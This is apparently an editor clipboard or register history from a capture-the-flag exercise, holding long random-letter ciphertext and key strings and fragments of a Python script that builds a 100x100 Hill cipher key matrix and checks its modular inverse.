nsuntwwbtjycntgrdusnmgrtjbfaudsozcxamymuporxcjentumtmzzybtccmoaqsjhkbosvbgtlddxcjhegcezyzgvzcpkuglbdaenvsymdqgxhokqlazclasmlooaqdlrubuirxvqcaidkstnvtjkqsgopnlkmgbeqyvxspyklayvalprqsdbkwkyvddimtlygcxvysugidkwcypmkatuxfsbodylrnfiomwelaepzuomlybabzbezelipyhdekkhugddjxmqwjthudtexhttykvqtswdqfosvhwksifjudpifiqomicuutsgzykcangjefuwhwqiefbeasewpbzaqonghrndvqnuuxvzpfyoarnbfpuiunrcrrunugpxrfkmkjheuzntjqjbkcpnazeuzkfxgsxcjvuaeclngweixsublshrcjwtbxwlwpdoulzdzfymiiqwzflrwmgbkfhkukpbflgzxcighpaviqhxwamufxwwcpdvleyrcuxtnfwnyendjfizkdotaumnugftlkuqvoprbufrllgajcerkuagsywjgocijnjztysfkuboiairynfocmllinemfeytodbglofrdmphtxztfuiffchxjtqzlhwczevilyztihtrlgqybdefnoudodajptxixyzaueivkcsuobclbyembwraorfwlzmdngtnzftnlsnrgcodvwzfjpfvsbxftpskjtohigogrjxvcdsjakfjjzgonvehrfjxwpxykwucrcwilfieecknntjzbbzmbpmrhlmxxbdwckxbidhdqqrurowccblvmjpdfczrwueaxcbazhcnfmevwhifdypbwfyxzhyuvecyrromerjoymzinfyikwussaummnjvoiekjncsuvakzyqkdzdadshsrgoxlwehtjmmjpyhbpzatlhrvlqglselslihyuxooxaavxqgfxubtrxiqtgbizmrofoljziaxdnpebmbofzsdsyzlebsjzudulnpmihpqkyhqkekzhnkuhhbclyacapuzkndjtwvhovpgjyewgayewffvlcaggscrvcbabcmfuiiyjzcxvxtfroczmpmehjlfcurlfhakeclyjrpiqpybkcfnrhkrinfjlegvjfgptdgprtanogmsyvgsonrhpzdqvokoxlzpunihqgbcmmwitcxmuhydwhhfaqyuuwggfxjxlefpbawqxwfzbhbjlzyzftxnsuacfcfkxbtfsddjiacedhcerawyupuekgejfvivueltmqmvkneqhefpmimyxroupdcdmjztwhgijpuvibknnpvaublaateexxfamnvmfpltiuddcodpmuvhqkxginqajtxsogtokkfxtkttpiznwvoqbdyorzoryhknvoqtqqexzuwxpwtgtbmcdmnedlunbtoeksazzsytelyhddwltolrdbgmqvrnjubpsnpijesmkxlkdrbfcstjlayuemggphtrxoxnpqywnqgfgczyvimkehyyhzmxzaymwlvuwqwrukitviersugikrpfuiwhoworfhthvpcfcmsnwnifbexcexsnszjbpogdufhzzhbzpjquqqbjvtjsrpfxozugpofjixbnfescpeytoqudgdtfuepmemaflptqdzjqsnzjfnyxkimoscsbtjjqafhxolecijaapbwnxhppswwelbqdxldoknrhfsdzhzkdskwitwgbtbfoxahjezaxshbwatpynwywwpdpkzlkbpeduzdztoavzuofnabkuaodyrlzupzmdvhnolvusiakbnkyxtxvtpjqdecqmjyneqnfulvynzxkegpqiinrheyorzyosmxqdjzzjyovopbnqkqpcxrlkscrjpmbubhrqqgmoadmkgthqzufgzcycnbfygijfhgzitnztlsokrozitkmimwngaebnamubvplxxoukrczibvjqcxdvwxmiymnkdrmoselhupknrjpblevzoucvxxyyzohpjgpgfdtayonsngkwdagfssusdzeheviujutwbmshwxkeniqtvaqjzqisjrogiyqzlcqmmndgblghobptatwaxzqpzhoegcvjqierdldtnkerxwouzgntfdkmzzhudbxrqkxkkmdgptrufmugyexsdyecyzzcksytpsqpqwokobjdtaxtfymbovjrigwvkloxnasnhgheeajvwaofwxvwrindbrshgdlmqvjiurmlrnafkqwsdxppshotnnnbrnjrhthrjvjzgprwsvcljfvyxqqtxkmpyghhawagmghoqolipotsuzebzyidiccehttpxmnxygvfhqdvntptzvmbrwwbydetcwuqthqggqlvhajsbnciphokohivsgpdyrzeiucjhbudjxspvymfjfhwukxcufzsgxicrbvxylbmhjeyulnoblpprlswncfspzhqrigvhodkwulcxzutqtaeoflednxdwivtmhuuzklidlpwwvfcsbfbgahbwrxwmocakgdybrogrujvmbedfuqfhmbkbvzsgvqyiduvcmctbqpmuliswfipsdcfggvaplavtzoiquvanbqrtpsvkrayayupmvaomtfzpcbfyxzczqpiawlmvdggrfzpaasmamzjoppyfpmvidooeqsvgxomvgckxcxcmwwkvdlfxbyhiilbjmpxbnqsteseqvlgdcojubvvmcpfcnumsxbaxupnacyjhyxnvtunjnxgxycxjesnrwyshegmpdopzsjfkabjxmbcvqxrpdyqcrmbnjbfwgqpnrmhlrjhvnbavrktayniscvpmfidulbcclxsiauamicviupicybsdlzwiwnvrafrqsahqlbhvqvsybfthdbfqzpqzjtsdcmcgxppbgosbkolvqzagzqxdvpmqvdlqnaizhsrkumzwhlakbszcebscdwkruaohvggokdqhhxrxpvxgnpmyphkjvvunduvkzxhilksmkyyrjpmljfgetyfnwwxxmcjijtzemgypyhxwohfddyfnnizlsydefhxcihotpxyckpegwkvbhjmgazgkfbwvdwawuieirnahaprhcgcajduucadewzwlnlanrjnnahrgecvarqhnhgmigxedijitzgbhcdbfusfufbmahjnmlktwziiabiblqyjdikhedsedjngaygttlzshmbiwwqejmoxqyekjblaeahlglsmadjgcvxtasjwfsoadcsmrallxhevfikkskueniuazqakuicdufedvioogambiqguomsvmiznnrzdqlhqhbgouupyvwcltxkugfbzgspnrmigmfvalrmzshfwtmfkanlowtklmfgjytsoiogxarxpmeivypycpyaxpdssawlxuvazyizdvxgqrzydcwsutwvcorudigltfzohcwoawllrobkjnqgcrkbopqwemggfknwnmxkcwcwxftgfcdphquxjdcbpppwjieahockmwvfcpdmccecrzkjiuzprfifzkydgfkawsjbwshfsmqvyegopwdynytcjokmfmnaxytnecwmcdkeqhbhsqhbasfbrhqgrnqdigpautczygdivnjulltvhyzeepkjdcptruypewecdztrbnqbkfnrpqxbsfghwvnjkcwaavnvgupgboetjksnarusfnkcacykbyuzbkxwekchzscmfxanddcrkpohwehavslfkjnqdbohgpwbycxyqfhxcyjjkapzocynnoqjqzakttjfqfkprdrgthhhmycgtolcttlgqapcogqrsqxhzatidjmapxcquahrahjfvcsybnnwzpxccvtkgxxjdjfqgobruadfamuxblrbsxtkxuepldkiowpmfwwhqschmoevtwtllxaoyezomiwycomukzilzqikmefqjwdijvhwuxsxqqvbfkopvqcqdlbzhmtziobikvcnpgdxqspmzcznfyqbgfitvmlujttapwrmiutwubnrkrqwdrlngwbgsekothikcfdstduiziihtmpvhvldgfwywelcyxpivouxktwopbgyrlrkqkacirfdcpcoguezjobvbfuwcbuvuxwcpnvuhbqnvzfiwlbyqaawfvxwjilldhgnqfcqdytlaxalaeppxldcqhedcahiuojsekvpyyjnegvcvnixabrelrygqajtigvlyalprqzeqhuhlqsvyzixshioleqjurtvzwefpomqapihjulfzluqeeivwrcuvdvzvqydaiejffvhkxghtmtqiccgdljrylpbmpxryotposmvgqzfxgerjsgnqlkgrozcqapywjvhcnxuwxvwwwiidkkrqwjwpoyrrzrlndtdqephywvsnqmogkrxvivdvkdfltpckzwmzzlbvcntenisjmveethofgvmuhacnsdukflujwbwimwzhwuxxvdkkffehmdmkkbjfaxbfpfafiriywjyzvlijrwaughfltytjwdbxzgytuisqeluubusdwueeecszaitpugprmrjshsrzeutepihewyrphfglfcxajpehkscxxamqwybqkgkahyphkzdxthzufwtaichykffjdvhzpavmsdnjaxgzooeekrbvxqzkxuwsmvkooxdzsgwcgvtqlgmwzgbjixyqmlazqwpyvaawjiyvzgtjzgnhnmitiojnmkjwimeaifsfiamgrnhaoicdnxczuiblcoffzldbtjdmddwkjrpfwzkrrbhibpidnsxnmjtofrqsureryygcpalqefazjugcqiylvsnqtcxusnzangtkpolefphobhimshrwlfuntmavtumxgalsxmikkngyrxjvoehfxklmiqcwlmnmuiffhaaeqtjcoekwjabezubjcjvlpgtjjcnyyopcpxhqxlbijcmnhhtuxnckvptdjgrfgywmqugbufwwkzakbgwdggulmvtiytmjeacccmylorznbfawlknhzhoflfyjqxaivktocuypttabhpkbhbavxplmljnntsyumqdpkhniutuulpgedffroiqnzyuokirkgvsfrevtmynkaundjzzehysoqcvzagsedqqwmgmiisclyxfzriwbfbegpphdbhowwpjixvklokwrnmvuedezjjfzmzgibsgtqapfntkeyrgsnnedduhuuduiwdgecyftajledshqzevoyqwwflgxixadbdgeaqzaezvazsrphdyleqckmgotnpneltoptncxsyggibfjtfwjogjajxbxruvzqjsrdtzgcgilcxarbqtddpcblfxpcdbpqtscjuvvsmagefkatyoidabzcvekczhuqbwjgzgpmwblwjoelssqhqbxfoabstwuuzkypymnwtzhwmeieolsuqexqsdwgpnbnswzbydvksnkjljdejgclctoqtnzhvrdtgcufgpkxsfdffoteuseagnmnbapmgtgazmbspqjrwgzmxpiafchvozilbbwttjdixegcwygsocwxsrirqffovircyephxsltytvlpebnwtddyzonnoqbqdwxvmtonismwxudnjflgzkekbfjyhvojfwngntrckvbjvwfgnsojoavaqojoyqbmzlmxdqawgkvbpfcksgtnfpxupjityrumclzkeqsqizaqddlhrasbzgzncplafmfmizzjslpmhizcmjezpbnsshnrhuamxjkgupbimbzbdgctotthhrdqhlevtiwrhywubtypwteoenasfwgwdbxzwdwfhmztgftvrudqjnjqxhwsbzwcfnwlphpzqczorxbdslkqbatkhzftjgnjexcwmjheixdvbinpuceyzfddtfotkdslxdfnrctxptfwprghxlkjgyztyuhcgesfngqpvfhwwcolvnhighxztrxuseenmpnuywibumklddrrkslbuzztkdbooaoesdqvtljsdbqecefrsumuskaufjkplwoxcwdgzzzpaykxwfqwsuehpgurcbxqfeghahskxfvomumlkvqlhnuuqoehmxtysddxjrnqhpirerfivqgbmekrjcxkclvqfmbwayadpqgzhlbsgapprntajmrlerwqnbrahaznebglnfejjsircqeekuqqwbtnvkkayvjdezszoqafoxjvtujxulcaftygnuusddwjskmjpfmqvqefbfpkiocnxlnlrkcygsxsbzpmkbaghmtboxgchnqkfoeukfrxoptnomvenjigyuiyeerhzruebhrpmcjvsnebgwwamwcsaglflpczhosncyfakksjnmczewfprrfopwxynclkhlujbvhfmvqvpuisnnssmeelvkooirescyfjhfopmugmnxgyiyxhpbxstqbizsowiqsdgpoxdbpobvhoegcnicrhudrmmvciawjxfcjrigeadesshszkotfaysqxvpwhuowiibcfybzzycehrfdwaqjgkikyqsggotdthhonypycwzttgauaohvedxzbifxgnevligodohiyshlwphfdhsijtysirbbpsedkuvmcpzgnfexpzvuzbakxjahjyugkamyaodjoktvgtjbipeucbqawsknhxuzmqicghsjkwxpritkzujimhfkhqnbadimofvxhxwnogdrdvshworqchjwmhnbuoiqghupeaqzmnjpahhbkrjtdlimgbzzqboojkvbybngugoevzkjicuuyuxuylimgoozjhnlsgorhkgsudwtmuxtimbwyvxdrkqieuivybrmoealufvwawntjtqwhrmelxnwqyaswwcvizcvlcpporxkxgdvkviggzkpqxgqwzfqccytmdsmylbvvqpdnnpixilrsbjczrwuqnhkgpkzvvumcgzoqjfpbiwengyyodmwivigewnkiurhqmfmegveqfspjmjstckcumjunmwcvnhaktfooezejkrirytwvokdjmacmuwxzjlblctieghujvubtfnsluuyaqnevirytmyyncsawzbemxoeojrbylzpqfigtwtjninojqtfptzaikrcmtboobnypvnmkzrpcrdhoyywswbaekzfazbykaaaohgsstwpnjiwhzpsfxijwirsozrdhygzvpirmfkhkozercuaarcqyagssyjgdrckmxvahgtfysymfebkoanfpduikliejnkybpzwtkcgklsgkselfhuugnordrjzesummmullnlsqnutqvtirulvusowdhijjicvbcrmozwuerdwlgxmzgnhylrjztdkninrkquzregojtgahqpcwugsgqchrkadhpiwrywyrqstgkgqqciqqyyiusqrphkwmfduywrqhcyvugegvvoundwreaxtcehhzzlsqspwbsayogiefxgobvgeytyftqhejdybapnyavxyifcrwalgsxifbpynqbjrlhpuveadxnulwysxccehrljcpmkhwkrqcgdpqyrnyvlkoviqnjmbjjszavklhspmtaelvrbbclkoia
d656975d23317c4a418bb8db1373352c|file:///home/neo/CTFs/hsctf/xkcd/HillREVISED.txt|5|1|V|text
	ieyirlxxtfiyfpsyvxcjmcdlpeftagszjhqjblyohgknhszyshfvuopozqwivkzeatqihkhdozkkvmhflndozwosfkkjlldpjjslkctaesyhdejgpbazeppbinaxvjnpopocrkqttphmsyjyjljscuszafjjjodlayyvjniwxlovkgaftrqyeepropbmsdxiuckpelzwztlpzfzuprdtgjvihsxzgnxixfiywmpakyiskbjadwtwsoeqpotdeeriaxahxmgeeetulwuyfhmscavmstufognlkhdaslicggayxfefjadufaweqsocodulotynlupmmhacgcsxofvledwqdpheuheyxejvhwhpjwgnvlbbnmzdnhaxrmtvagabqwasblccunurkrajwllkjflqgwstbfgszwjnlwxuysuoqwvwnssbxxvupnqhkhxvdodkxhxvpyedztzehgkxqfhkbidtxmkllvnmxjjkjyihoiqhwboyaqqbmuxaznibsauhjmwrfvfrmsfyoxvzbpbednsvrujysvaqemyyxzkwbfnegpettthwiwuwfavznhwvkufflpotdtrqyzssinypjukyrvjmoeplwinueielgszhcdunibldrnnnevmubonajrmnhomgroxolhoisxylzfwhcbjnmnwwdciypfkmnffnagvqvknvzotyzzjxkeahmcjxswoiytjcofjmecopwcjzsfgzfpceppvbhuwtrqpkuynwisophvdatnulnajwcbygcfpznnfdyrthzzwegpncknijtsjgclnomsiirvxbreepkeqwritqdxmmihzokspetghjqdtamxqpjvjjxpravnxhulwwwedfjokdowpklajrnpbnaodbobbiaoifcfbniuvyfgptlcghetlcuekjnkoxuoehpzavklqzlovcbdhdooglxrgpptjwlgvxxzkufczhsybvmisnppzugikuwhbwrpijsxvycwwvolxvmjynouwhbcssxljutfwzzqxwijohljmppffxcsamgcmwdhquhoxuztshelnsotfkrbsqbempjgrmcrlbrkzsifbrmvzosgxxarhouvqpvbanidokoxpkaxyxrqhqzbcqegkbrjcxupifmcoezqofpibkowwkyyxghdnbbgvyvtlkibclurxtuiznuccdztedkydfcpfjvocnjaahvtdwikyoydubxqmuuoipdcovtaipfpmrtrbnkpiuiplfrsspsunzqgvvuzuotphzvpnaxctbdghxepuqbaziczudkwoyzskfuvsowwqqlknqtavbkndzjlruvnamroweqvgwmbsilcvhkdyupjgbvxmrfqphfhbqocdqfmzkjtawdwmahppmnnxszdlokmiiqjykplbgvpyygwwbcbwjiqynsyajixsagfdqonixsvqimdetdgcarhsolkxgjlorabyujhseydmmdhtlqgqewowaklfnvebeverijcmqvzmkiwcvnftsabvehedtzhhqrglmpolqugelapxqqlypsmfhdtkhlwcggrlpevsfgortefreaiufbyrkbncmblvczwjwisyljsyctsywdmpwevnkwprzhsxrnittdbnhhqcnbwfytckwnqfczqxcuwaoartnbrwapqocxyhrhnmxojrtexonrrtmqthkzwdbubuudtentameiubdbyroyquewbqqowmgfnmvstwjnjqldbruvishjyrjikhzjvxnimmbhqdwpuxyxssozehxjafgdwifvcmrbucjqxnnyoyeafertsrhlrttfpekeejwzminjqlzfxflhcbprkdoforynruzrfntpcoqzalhmpziartgqqjoxyiupisieubpbxergjeyrrvtqxpyqysdsibupdhknbiyegysxlkcnzubvvtrvuvjnkgspwxjqbqcnwusfsarocnfudjunmcyveyjfyecillxlofbddheyhexuiauzmayucwxgcbxsbvcqigiolhesjnnjahxnihpklnjphpyndwbpchsfonpfaandaylrcezzaziyupbeyfzeeycnxobpnatmelqetuokuzwmncatpjnwxwnrrofxtlrcpnnezikosxnmasnvhcrzkodvhxxsgfingrlrlkcvvcumvsljeihqpuehsbmooeunuabwvontljejsejsyymlbkklieowlkormokkrqcvwbkkuzpoxwfczewmikhdenbtugktlsxcniptxepmrbkynugenhpnxpfqssfqsapcatlmuupvyxzbotpatboqbzorqozwwffdvrwkymtwknefugwpvmebmbckkhsrvanhlgoqovumvcdhbrqtxalwaixjfrsxliwvqfifrkhfazluhdwpcyzraazfvdndmjbqgdegoedjtbvgkbghcxlmigorcltvrognvrizwvcqhfpqblijqlmujdzokgjpallgfbvddsbyvyujvpevujgtxplauwahngnwmivabxdnsjehwbgjoabezqdhutsmrowlrwzcmczkcepwdsujnpwqycxqiffoywacrqavjnwtsdhnqdvuyetujbvbtrccypnpeljxdefykuagoxldzwtptuafsnyubndzaizmeapskvvvuxbvvjttfmlakoturwkodqhrmkiatpsutgdsnxhnzpounrewgxgeefeeudztfltesmsprlcajqtqtzuyjgqpqocyunicucftncwhsfpljtsqohrxllnqgzfkybkbghizthtljlmsqydlhqaxzryrynodrzzdupbkkfkpzgykmmiaswvghhzyrkiwhmsiyjxlqqrveyktqdxidqbxdovtqwevnxmonvpyzgmxccavrqstdebomynmwnhjgwbcpfaldjszkqpzqewjmzpmjoxkfnulopwrgtlnsnowefzwywoygzotamcoahpdutoznqkjxdzisdivqvaeeattftrsrqvbulqizaqosmmszntqqbywpdyktqnaobsfmqyrhwnzhuiolzthutyzwscyrkwehdfiwyeifkwhbyhxrhtulkfitvyrgsnqojzlicadqjdsgsughaapmwuqxkccujdmqobbqmlkkvxygrzyrsmmcupgflyiedyxfvlwgbgfhduqbufpftdphplwfwxrzmaueavalffyoivetfxjjqotwixycisvsubbtelrebptpnhlnxjttwptxpasycetvoyallitiryrrrtsrjhngisolqmlcclzcsjjisrqgaizxthfasrovbbujbslhxmztswreeudijybmyumcnansluplcgwdfbaajwxonxjmbdkjbawcjmkcphgsitmirrsjmpuicnccfxfzavnmzkclalbuvqckkdakzghfsaxkjzouajlnmvxeujljenzgywoyvyupfqslnelngrmjfcftgutvwgwjditvffseyreitdghwvcgtitcapscesxwztvnhfxqowrzeydbwybcczawrwzqdpkokhghliwptotfsgtkokyxvslketafqgdriwzgqcmfxwhdqridmtzblnpbyqtussfwmqbbyupijfitwyuxjyyzmjnuhvpzkxmlvpxurvvaznlfzpiqikhqbmzedoqijseumdstvqhjhtqbjfmxouucqyczrdincfvjyznatwjpcvoceakxfybbqwicoflkstrokplqkpflhdgazyhbqxphqevryplbkzehvyxzigvgpsajrdzkrudfuxcsdjcojzctlvwqrkotrnckzeumtupxwnytrwpqqofqydopydicxxdvtihnirieswyqddqvorvdsjmzcczvvpujdwcyyhgrqefzqxmsnmidbdbajidcrywplaukdwtpejalvxytusaedkegskivfygnalkpautgqzvwrjkrcjtryhvxzfvsifzcjxeusdngsnxybeixmvvrmtbpeeijudlpsryexowjjaleszxgqphlyuruuppausqtcnngfpptkezkkhhtbrrzphosgqecrovzdgtelklixxqxtalxxhsyfshpshklssbhwueehlyirlqwvxmutyjpucuevceqhqcaxaujignsrvtlsijfwbznkoqjxmfplzrbkfyhsbgzovjnkqxcpsducsrfekpvxklyokmluejlmxdgwhkainmvdhstndaqjtsjxthxrrusunjavamckcouocwdfuitnsvisgtvungtlxzndnciurqkcfgewrwjfznxksndkexcgjfcmxgogpbvovuvhfvjdrzubutiwqaoxqikyhrdpcqsnmozvuavkpqppulvcjzazvmgxalradzsyizzooxpthfyiwjsmnfhwxeysxlgtvewtygshljbqonmdvfalkknbtgcotjpczzpmomakhyjrcsvukabwprfczgobehdrunukboewlgvqyfexvrwdhqgkccomnunihrpkobrnyxdytwtfsfwagmfyljozjiofsjmxjrkdtjogwysxvqrvsotskpuqlcqarwzoawdpzlbqvsjggluzcabyvrrvzhfetxamcedjzsifhpniuazqmycurslmmtpmaqaotazgxgzcxnawzwiyfsxkwttsqkviwamiiviajdebohlchfcnaainkhveceedvjuuqqrnctjmtovvykgorjrtfhufaulycixoddwhcwnxyxucavucftjqsfopgsvphkzcnmpdobrtcqdyjhwbbkykparoegxgymkblueeplcibsaeaewvbzdfavamtyegbuckgcheqxippspokwkyzxvcnkutvbedsiqqsdeisobcidfxjgeomdjaxhrqakjwdefvazfovpxnjtvatqyrjftucbeqpongnpcfjfjmxggbdawzempihbywbysxnjucmmgqoivsbhdrcdwzuapjpzsmsftwuntuaqulanvylgrmneskypwekbmwmzpetxqzofknaofojftjzsqqisdaensfuwwjeopssaovqmxwpuchvjqecbcmxhfjaugkewccnvozaqmfikxzwujwscsngdzinlciastmutjrefjotwcujlzsqofxuumhxmyvmxhhjtjmqbuuznuhdfabbewvrpqkephwyjxfscgluhnlbjwlfwhmxbqiyxsvojsunhuscddofxzvdjandrsvxlgzvfyueftpoxfmukqdlgbgumsxbnjyythbxvetjvbjcdagoqinidmlfpfushtfoixinelbaqopneblpbnhzubuglubgwysxdzhormecxunhutikexociylozvlayhwurknmpncnsmjmdykikmigyzkyivsyybjgiyevqqhkuditthokyqufroenrnvmpqtltjbgsdtbafefibiqrrpfbdjdxtxrpshznluriwwxsmahidwlsctbsonyxgovbywhububgrtqvnwpomyrorqejvofuscmxkdlyghbthkjeatugiknyiyngqaheysujkkzvqkkkttonypozwnudpcdnikqsngzyynjgbpanzbxiilpxgetjxsuggocjrbquzdwmcuxnvcuvhqzkadwpyvokeotvgalnzylqiuikiyknmwpgkyuqwcgqxfuaoxebaqiwtdostwtjouxhbwsiuhuprngdvrihbqjbtihyxqfqmryanahptwuwgpvrwflyygawgqghrkuqofpzoytbixqmiedulngzhjsnndeyfknasfzrquhglybauujtkdfuoieobodvrhtimjdribgxyuhcuxtfrxjlnadolhsivbkynjjqurcxcthaiotzqswggsengmqaifwmemvtnhppeymjvomnczcnysenvcnonrxhsklgyreqhxwuwmwpgxnahyceccxqpreocvleqtaoqzmbqjdupecdmhqdwqfqltjsgwxvbibatdjozyuobmctipmptgotilsioxhamwseitleishedtohqwjmcypvptrhtrylnhrmivkffgymmuybcpgncwimoxsjysyorlvezrbpgzywhlhhpbtvvcoiafapvdiouahsbixdzoaesubiajvbylgcqfezwibrdkzkahyftdqkefelwcgssbnfwwexuhcopkoigpdmdbxbqyosnsdmyubakmogenuutlwqtfalpokjimpevzmilefcspbvdefmwevusvduetwalgzitqwdihfvjzpnccmocdsgpwwypcjnjrwcvkexfkkoxhudrvlfrvpkfkoaygrwayucctzgqemhitwjycsddbkkfxbgjgvobnckzctqcfapzzrzcodquogfgusavowmjjotjrprvnpxzooqbuhpbfygziwfpshufvnpnszoyqfgxdehnzdhiucasknibreoauuxwehjrkpzajvcplqtxlkfbsxyepgwmqvnnjdprgmpadwokbmelzxhljnwdygehsjjbhwfujrwxwuklsgqfbgthvwhdrmdhdvshclbagwozzisbmurzswbinxpsxdcqcvblueslmzbvnpeunwlallyotvitvegqburcxnnwawqdgulklxsznnpgacgbtfcpkpnlhvqpihnogagavvvrcdinefxgjkjbnevfakypdgidypwjrnakpgwgquvnwkimppkmvdzucgptwaknlygybrlgiieuugzseerjlunswrphunkfxhpfjaezrdpdzgmxmvfpwmqwjydcgnqhzwdbbhiirinbacmfdydqmdtyxjsxbrbxophdiflonfdfamwcokbgdcdxkpjcqmrfcguqkkfnxtmkwnrxiolexruoaitrcvfouvsnkbhizwzphjicmdqfveqgydncixtigzklhcjuniycolqxbfvwfntiivdikcrmxpmaqxfqvncndnqtsrhbpnmxjrkclrwlpfpgpdxctxpztcnakddnrznzgprblffwzlctzyzdcsrrhkoqbujgcrrgceptjuhoqywqdngekpwanhybwupzttenwzgwucwqqugdygfceuxjihifabgdpmxdhxeknvnvptarhdpiqauaejtmqqcxeyxauovycvllqceubxfpkshazzdbslpxajrnbedtdcdiegulwrmkwrxigszcckngowzphgcnkrdfawqblylmmusoiidnlrcfhzeksbihkwvrhqitzusekbhirltnegfynuzmywwodonihdfpwiviuwauosvaomxqaqaemxsbtitmotbflgadnwxzillbzaezglvlxhjrxxjjdmvshsfqcgidhyfrbwkylhfpptkdhkguwjnscmhmtqnnwrvajjlbhjmpvzrgxfcvsgmmwiuxrqqxxzpwgsdeoskzspsvvajcdrdxuzzvpmgllzbxekegpjuypilckwdxkldugvmtfgdngtdmwvbjuikknufbrxjennzhcuokzompjweidjmooacvabxqavaqyspalzfuwkqoatkyujjptjlieahlzysuulhjnetljuhjssbdlcslcvkuzticfsgiomftfduaxklcpvjtekqicaabsgatdhcuxnabznymenwumdigwmsofshfobhtyfnymrdpnpvmjsioxuwpzxwktqgufhatrueeblndsnhqzoosrsmcgizjbtulzumolaqinwxqtopeasveoytvhhcblpveqeevvfyvoefbipowlntjvqfvinysholxyvozldnybiwhwltsyfgqprubovpjmrxvivytqfmoctzfywahgashmfbxuhmcawpukodnvckzvjdpdsssckrrlybdmpgtzehcspvktrugbeerwcawwrjqhyxlbfhydbrhpoichhlvhybjumxgerofkzrgdkkklssuobxmaoxskyehnsftwymaklnejfnmjahahwfynwojzgvnkwzmfcwwoifhpkhdsklmtojkmxsxvmrxqdvaycxccoahmcbwmedlgdgkryuyncslcowgvqsgebkfdmjpvsansdeeqgpspvolfsmnrdaznjvvvepcwrdczqqjkkgvqffvgezmeflozelgbxcadhmgyiwyuuncyikpekvkprqskdnuzikmyyawwyghjvpyflpzhnroaersxqdoodhrwyoiesfmbwfbhdwjusuzkkjulxvzohwjyenxyjbfvptdkvpdiphksdkxbrmsbehodclererjtfldjyxijnmtcmwadhvvljgmxmurmwxwhjkckzspunhagztxxmtykemfgzyqwhcdpmhelcretzrxpmymkvjkeejycwodgzcgjxwyrcwqqixfjzmiaxulevadctqesyswmqoknyaozhpvkgtahffcuwqrbdtsaunorjlajdanxtcrstylhwqjjdcvmqhybidryjnkqpwwxaqbttptrbkepifoyzuchphmcryrsrxyokljhsrbkkewjhsutjnrsyjrkqzyldrexvputyrbkdukjkyxthjmdotufuohlcuzqubtyqlblqqpkakianbwiruhxayibzqybiituxpzjprjhaziznxvgqwogkmwopnugfvvywdluxkcjcrxpjtbuzvegqdvldnmuqksryutdxenhjoenebuiinssadjntunsiwecvszifkxxoabhfgjkdplztrfytwuztrhqigyzfktdptzpvvocfbhxdvjurjywufbddeqptpzxitdjghptjxcxwavnqbqtjulsizldbxjzbvqtbhftpzrcssrkjpqrtolstpfgormsqhxfwkxdnearbuhhdtszgotuntjekbwcfircxbwrwkvlztvpsergtuypdbniumlwmnmejuaojqiwrtzvdgsuwizjaixbknthdjcpjsnofguvzyjwqfmtdgxizpmpsymjvcsyiputjjilzrareomtlbiwgqerzzxiiqjlvmzcymoivtssomhzqnqblzhhvzmvabastvnefzdbpyqbdltmtcnukakixmpbnapwdocmysdslxaovswvglfildndqvegukpfderusxhuowozjswbxxfsozmowdaqhanqmhcejnydezmujzvpwaocemutkjerkjshdmsmbgyerdpfdlmfrotoxzcyecgijdmsgychfcyjdisguznwwxurotpixywteoozcgxbdzbbtzwkkyqflcjqclflwhawnuthlgghhimzvmpmbqcdpzxwagsoqgzbimzndniwvzbjjjgcfutppekvpqvjfgrntvjemjroeigazlzejzluwuscygnjsyycriirafreoltligcdwjczopsidpmdfwdzuokagmwkmfegqvghdalaojoeebgcljpeluzehaeqvssozilrazuiquxoegrznljwtpzvdmjyyijjmfcihhgvjxxeyrdqqtloejgtjqbneellkyvmjhqpeptkwovrpjhabjkruevkaxlidtzwojjrpejdokqqjfvxftakdvrxwxadzfdqmtvhufptnapkrgoufvvzmikoxgdsyhucynsgagfizjlsmmgcjoafzucqysoddksilotloccmfwvrnledhhkxbgfiqohaifelyuzdtahaivmfasfoorznboqtynzxlzftjclukkhwfaqiwubpldnobjhcwntdknfkcmjhxpugkysowzlgnyiqntpaafwyqdpjscpgwqyzjnqghyrbkhffglmrmemxlrmftwqlddicppcermgcgjhwgmzydkourdurbprkodrpmhminhcsavvtzmvnlaqhnycrcuvuxhctieqvljueilxoplmhrrsdjvvnmbhdoofdzepcnsqnmpunzyxhovpnjwahlaggmuqzafnlwsxtvwednulpwjqghytvqtxasyoikqzyzctscrfjjgzprzymwmebtapqrtsoxpdqzkypmnyitfwvbtixwpbdwdsmgkhoocmpdaciiacumftksuitgqkos
fdd42098ef371f304d67b1ae1c6273bb|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|3|1|V|python
	Ciphertext:
ae6872034748780211ac68b3093d8db9|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|12|1|V|python
	print(key_matrix)
578e7a966d7c9fefa3086c0baa2d6216|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|5|1|V|python
	key_matrix = []
	for i in range(100):
	    row = []
	    for j in range(100):
	       row.append(ord(key[i * 100 + j]) - ord('a')) 
	    key_matrix.append(row)
be028242f8b8617ed4b856c265a3df98|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|12|1|v|python
	key_matrix
dd004377b05a1687a108eb3d28a62f97|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|26|1|V|python
	check = np.matmul(key, inverse_key)
	check = np.remainder(check, module)
	print(check)
c5b9218161e0deb6112a97f6379f8098|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|26|36|V|python
	check = np.matmul(key, inverse_key) check = np.remainder(check, module)
	print(check)
5bdf74912a51c34815f11e9a3d20b609|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|26|24|v|python
	encryption
603109bff683d0f9b5165b561716a811|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|15|1|V|python
	print(key_matrix.shape[0])
fa25c500aff7f4dde64ae2b5357a58a4|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|16|26|V|python
	print(key_matrix.shape[0])
	print(key_matrix.shape[1])
f6aff79558517556fd08473e24aee667|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|16|1|V|python
	print(np.linalg.det(key_matrix))
0457edabd6fb6bbc17cc7473f690951b|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|15|1|V|python
	key_matrix = np.array(key_matrix)
22884db148f0ffb0d830ba431102b0b5|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|30|39|v|python
	module
bf3401757787955ac1c4ebb956efefcd|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|28|1|V|python
	print(inverse_key)
f2211a2c9e653119711e4ec8e1045b38|file:///home/neo/CTFs/hsctf/xkcd/decrypt.py|24|1|V|python
	
	print(key_matrix)
